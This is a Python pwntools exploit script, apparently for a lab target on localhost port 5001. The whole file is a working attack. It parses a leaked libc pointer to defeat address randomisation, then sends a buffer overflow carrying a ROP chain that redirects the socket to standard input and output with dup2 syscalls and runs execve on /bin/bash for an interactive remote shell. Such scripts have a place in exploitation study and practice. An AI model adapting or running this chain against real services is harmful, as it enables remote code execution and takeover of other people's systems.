#!/usr/bin/python3

import time
import struct
import sys
import argparse
from pwn import *

gdbStr = '''
set follow-fork-mode child
{}
continue
'''

def main():
    print("Dont forget to start the server in the background")
    context.update(arch='amd64', os='linux')

    parser = argparse.ArgumentParser()
    parser.add_argument("--offset", type=int, required=True)
    parser.add_argument("--keep", default=False, action='store_true')
    parser.add_argument("--gdbstr", nargs='?', default="", type=str)
    parser.add_argument("--gdb", default=False, action='store_true')

    args = parser.parse_args()

    io = remote("localhost", 5001)
    if args.gdb:
        gdb.attach(io, gdbStr.format(args.gdbstr))

    print("--[ Send exploit")

    infoLeakData = io.read()
    print("Infoleak:")
    print(hexdump(infoLeakData))

    exploit = makeExploit(args.offset, infoLeakData)
    #print(hexdump(exploit, skip=False))

    print("Send Data: ")
    io.send(exploit)
    if args.keep:
        io.recvall()
    
    io.interactive()
    return


def makePattern(offset):
    pattern = b'XXXX'
    pattern += b'A' * (offset - 4)
    pattern += b'BBBB' # RIP
    return pattern


def makeExploit(offset, infoLeakData):
    payload = b'A' * offset

    libcPtr = u64(infoLeakData[0x60:0x60+8])
    libcBase = libcPtr - 158986
    null = 0x404090
    socketNo = 4

    print("LIBC Ptr : " + str(hex(libcPtr)))
    print("LIBC Base: " + str(hex(libcBase)))

    binBash = libcBase + 1614162
    pop_rax = libcBase + 0x3ee88
    pop_rdi = libcBase + 0x26796
    pop_rsi = libcBase + 0x2890f
    syscall = libcBase + 0x580da

    # dup2(4, 0)
    payload += p64 ( pop_rax ) 
    payload += p64 ( 33 )
    payload += p64 ( pop_rdi ) 
    payload += p64 ( socketNo )
    payload += p64 ( pop_rsi)
    payload += p64 ( 0 )
    payload += p64 ( syscall ) 

    # dup2(4, 1)
    payload += p64 ( pop_rax ) 
    payload += p64 ( 33 )
    payload += p64 ( pop_rdi ) 
    payload += p64 ( socketNo )
    payload += p64 ( pop_rsi )
    payload += p64 ( 1 )
    payload += p64 ( syscall ) 

    # dup2(4, 2)
    payload += p64 ( pop_rax ) 
    payload += p64 ( 33 )
    payload += p64 ( pop_rdi ) 
    payload += p64 ( socketNo )
    payload += p64 ( pop_rsi)
    payload += p64 ( 2 )
    payload += p64 ( syscall ) 

    # execve 
    payload += p64 ( pop_rdi )
    payload += p64 ( binBash )
    payload += p64 ( pop_rsi )
    payload += p64 ( null )
    payload += p64 ( pop_rax)
    payload += p64 ( 59 )
    payload += p64 ( syscall )

    return payload


if __name__ == '__main__':
        main()
